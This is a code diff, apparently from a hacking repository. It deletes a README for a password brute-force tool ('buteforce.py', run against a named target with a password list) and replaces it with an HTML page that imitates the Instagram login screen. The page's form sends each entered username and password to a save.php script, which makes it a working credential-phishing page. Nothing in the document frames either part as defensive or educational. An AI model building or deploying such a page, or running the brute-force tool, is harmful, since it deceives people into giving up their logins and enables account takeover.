@@ -1,17 +1,53 @@
-### Steps to run the butefore attack:
-1. Run ***install.bat*** file to install the required libraries
-2. Use the ***config.py*** to write the name of target and specify the path for the text file. 
-
----
->**NOTE**
-Use new line to write a new password.
-Example :
->password1
->password2
->password3
->...
->...
-
----
-
-3. Run the ***buteforce.py***
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Instagram</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background-color: #fafafa;
+            font-family: Arial, sans-serif;
+        }
+        .login-box {
+            background: white;
+            padding: 20px;
+            border: 1px solid #dbdbdb;
+            width: 300px;
+            text-align: center;
+        }
+        input {
+            width: 90%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+        }
+        button {
+            width: 95%;
+            padding: 10px;
+            margin-top: 10px;
+            background-color: #3897f0;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h2>Instagram</h2>
+        <form action="save.php" method="POST">
+            <input type="text" name="username" placeholder="Phone number, username, or email" required><br>
+            <input type="password" name="password" placeholder="Password" required><br>
+            <button type="submit">Log In</button>
+        </form>
+    </div>
+</body>
+</html>
